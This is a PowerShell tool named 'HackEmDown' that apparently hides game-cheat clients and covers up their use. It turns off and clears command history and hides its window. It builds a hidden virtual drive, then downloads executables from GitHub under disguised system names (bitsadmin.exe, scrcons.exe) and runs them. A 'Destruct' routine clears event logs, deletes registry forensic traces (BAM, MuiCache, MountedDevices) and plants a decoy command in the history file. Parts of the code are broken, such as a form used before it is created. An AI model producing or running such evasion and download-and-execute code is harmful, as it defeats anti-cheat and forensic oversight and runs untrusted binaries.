Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
try {
    $consolePtr = [Win32]::GetConsoleWindow()
    [Win32]::ShowWindow($consolePtr, 0) | Out-Null
} catch {
    Write-Error "Failed to hide console window: $_"
    exit 1
}
$VK_CONTROL = 0x11
$VK_MENU = 0x12
$VK_F11 = 0x7A
Write-Host "Waiting for Ctrl + Alt + F11 to be pressed..."
while ($true) {
    $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
    $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
    $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
    if ($ctrlPressed -and $altPressed -and $f11Pressed) {
        break
    }
    Start-Sleep -Milliseconds 100
}
try {
    Add-Type -AssemblyName System.Windows.Forms
} catch {
    Write-Error "Failed to load System.Windows.Forms assembly: $_"
    exit 1
}
$ConfirmPreference = 'None'
$ErrorActionPreference = 'SilentlyContinue'
$asciiArt = @"
   __   ____  ___   ___  _____  _______
  / /  / __ \/ _ | / _ \/  _/ |/ / ___/
 / /__/ /_/ / __ |/ // // //    / (_ / 
/____/\____/_/ |_/____/___/_/|_/\___/
"@
$label = New-Object System.Windows.Forms.Label
$label.Text = $HackEmDown
$label.Font = New-Object System.Drawing.Font("Consolas", 20)
$label.ForeColor = 'Yellow'
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(
    [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
    [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
)
$form.Controls.Add($label)
$form.add_SizeChanged({
    $label.Location = New-Object System.Drawing.Point(
        [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
        [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
    )
})
$form.Show()
$vdiskPath = "C:\temp\ddr.vhd"
$vdiskSizeMB = 2048
if (Test-Path -Path $vdiskPath) {
  Remove-Item -Path $vdiskPath -Force
}
$createVHDScript = @"
create vdisk file=`"$vdiskPath`" maximum=$vdiskSizeMB type=expandable
"@
$scriptFileCreate = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
$createVHDScript | Set-Content -Path $scriptFileCreate
diskpart /s $scriptFileCreate
$attachVHDScript = @"
select vdisk file=`"$vdiskPath`"
attach vdisk
"@
$scriptFileAttach = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
$attachVHDScript | Set-Content -Path $scriptFileAttach
diskpart /s $scriptFileAttach
Start-Sleep -Seconds 5
$disk = Get-Disk | Sort-Object -Property Number | Select-Object -Last 1
if ($disk.IsOffline -eq $true) {
    Set-Disk -Number $disk.Number -IsOffline $false
}
if ($disk.PartitionStyle -eq 'Raw') {
    Initialize-Disk -Number $disk.Number -PartitionStyle MBR
}
$partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z
Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false
$form.Close()
Add-Type -Name Win -Namespace Console -MemberDefinition @'
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
'@
$consolePtr = [Console.Win]::GetConsoleWindow()
[Console.Win]::ShowWindow($consolePtr, 0)
$form = New-Object System.Windows.Forms.Form
$form.Text = 'HackEmDown'
$form.Size = New-Object System.Drawing.Size(950, 400)
$form.StartPosition = 'CenterScreen'
$form.BackColor = 'Black'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.BackColor = 'Black'
$form.Text = "HackEmDown"
$form.BackColor = 'Black'
$form.ForeColor = 'White'
$asciiArt = @"
  __  __     ______     ______     __  __     ______     __    __     _____     ______     __     __     __   __    
 /\ \_\ \   /\  __ \   /\  ___\   /\ \/ /    /\  ___\   /\ "-./  \   /\  __-.  /\  __ \   /\ \  _ \ \   /\ "-.\ \   
 \ \  __ \  \ \  __ \  \ \ \____  \ \  _"-.  \ \  __\   \ \ \-./\ \  \ \ \/\ \ \ \ \/\ \  \ \ \/ ".\ \  \ \ \-.  \  
  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_____\  \ \_\ \ \_\  \ \____-  \ \_____\  \ \__/".~\_\  \ \_\\"\_\ 
   \/_/\/_/   \/_/\/_/   \/_____/   \/_/\/_/   \/_____/   \/_/  \/_/   \/____/   \/_____/   \/_/   \/_/   \/_/ \/_/
 ===================================================================================================================
"@
$label = New-Object System.Windows.Forms.Label
$label.Text = $asciiArt
$label.Font = New-Object System.Drawing.Font('Courier New', 9)
$label.ForeColor = 'Yellow'
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(50, 50)
$injectButton = New-Object System.Windows.Forms.Button
$injectButton.Text = 'Inject'
$injectButton.Width = 100
$injectButton.Height = 40
$injectButton.Location = New-Object System.Drawing.Point(162.5, 200)
$injectButton.BackColor = 'Green'
$injectButton.ForeColor = 'Black'
$destructButton = New-Object System.Windows.Forms.Button
$destructButton.Text = 'Destruct'
$destructButton.Width = 100
$destructButton.Height = 40
$destructButton.Location = New-Object System.Drawing.Point(687.5, 200)
$destructButton.BackColor = 'Red'
$destructButton.ForeColor = 'Black'
function Show-MainMenu {
    $form.Controls.Clear()
    $form.Controls.Add($label)
    $form.Controls.Add($injectButton)
    $form.Controls.Add($destructButton)
}
$injectButton.Add_Click({
    $form.Controls.Clear()
    $form.Controls.Add($label)
    $backButton = New-Object System.Windows.Forms.Button
    $backButton.Text = 'Back'
    $backButton.Width = 100
    $backButton.Height = 40
    $backButton.Location = New-Object System.Drawing.Point(800, 320)
    $backButton.BackColor = 'DarkRed'
    $backButton.ForeColor = 'Black'
    $backButton.Add_Click({ Show-MainMenu })
    $prestigeButton = New-Object System.Windows.Forms.Button
    $prestigeButton.Text = 'Prestige'
    $prestigeButton.Width = 120
    $prestigeButton.Height = 40
    $prestigeButton.Location = New-Object System.Drawing.Point(150, 200)
    $prestigeButton.BackColor = 'Purple'
    $prestigeButton.ForeColor = 'Black'
    $vapeliteButton = New-Object System.Windows.Forms.Button
    $vapeliteButton.Text = 'VapeLite'
    $vapeliteButton.Width = 120
    $vapeliteButton.Height = 40
    $vapeliteButton.Location = New-Object System.Drawing.Point(300, 200)
    $vapeliteButton.BackColor = 'LightBlue'
    $vapeliteButton.ForeColor = 'Black'
    $vapev4Button = New-Object System.Windows.Forms.Button
    $vapev4Button.Text = 'VapeV4'
    $vapev4Button.Width = 120
    $vapev4Button.Height = 40
    $vapev4Button.Location = New-Object System.Drawing.Point(450, 200)
    $vapev4Button.BackColor = 'Blue'
    $vapev4Button.ForeColor = 'Black'
    $form.Controls.Add($prestigeButton)
    $form.Controls.Add($vapeliteButton)
    $form.Controls.Add($backButton)
    $form.Controls.Add($vapev4Button)
    $prestigeButton.Add_Click({
        if (-Not (Test-Path "Z:\sodium-fabric-0.6.13+mc1.21.4.jar")) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"  -OutFile "Z:\sodium-fabric-0.6.13+mc1.21.4.jar"
        }
        Start-Process java -ArgumentList '-jar "Z:\sodium-fabric-0.6.13+mc1.21.4.jar"'
    })
    $vapeliteButton.Add_Click({
        if (-Not (Test-Path "Z:\scrcons.exe")) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/wpbbin.exe"  -OutFile "Z:\scrcons.exe"
        }
        Start-Process "Z:\scrcons.exe"
    })
    $vapev4Button.Add_Click({
        if (-Not (Test-Path "Z:\bitsadmin.exe")) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/svchost.exe"  -OutFile "Z:\bitsadmin.exe"
        }
        Start-Process "Z:\bitsadmin.exe"
    })
})
$destructButton.Add_Click({
    $vdiskPath = "C:\temp\ddr.vhd"
    $diskNumber = $null
    $diskList = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" }
    if ($diskList) {
        $diskNumber = $diskList.Number
    } else {
        Write-Host "Virtual disk not found or not attached. Aborting destruction."
        return
    }
    $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk
"@
    $detachFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $detachScript | Set-Content -Path $detachFile
    diskpart /s $detachFile | Out-Null
    Remove-Item -Path $detachFile -Force
    $initializeScript = @"
select disk $diskNumber
online disk
convert mbr
"@
    $initFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $initializeScript | Set-Content -Path $initFile
    diskpart /s $initFile | Out-Null
    Remove-Item -Path $initFile -Force
    $partitionScript = @"
select disk $diskNumber
create partition primary
assign letter=Z
"@
    $partFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $partitionScript | Set-Content -Path $partFile
    diskpart /s $partFile | Out-Null
    Remove-Item -Path $partFile -Force
    if (Test-Path $vdiskPath) {
        Remove-Item -Path $vdiskPath -Force
    }
    $recentPath = [Environment]::GetFolderPath("Recent")
    Get-ChildItem -Path $recentPath -Filter "*.lnk" | Where-Object {
        $_.Name -like "javaruntime.ps1*" -or $_.Name -like "powershell*"
    } | ForEach-Object {
        Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
    }
    Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
    Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force
    Remove-Item -Path "C:\temp\*" -Recurse -Force
    $recentPath = [Environment]::GetFolderPath("Recent")
    Get-ChildItem -Path $recentPath -Filter "*.lnk" | Where-Object {
        $_.Name -like "javaruntime.ps1*" -or $_.Name -like "powershell*"
    } | ForEach-Object {
        Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
    }
    Stop-Process -Name vds -Force
    Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force
    Clear-EventLog -LogName System
    wevtutil cl "Windows PowerShell"
    Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache |
    ForEach-Object { $_.PSObject.Properties } |
    Where-Object { $_.Name -like "Z:\*" } |
    ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name }
    gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskkpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1  | iex'
    Stop-Process -Id $PID
})
Show-MainMenu
[void]$form.ShowDialog()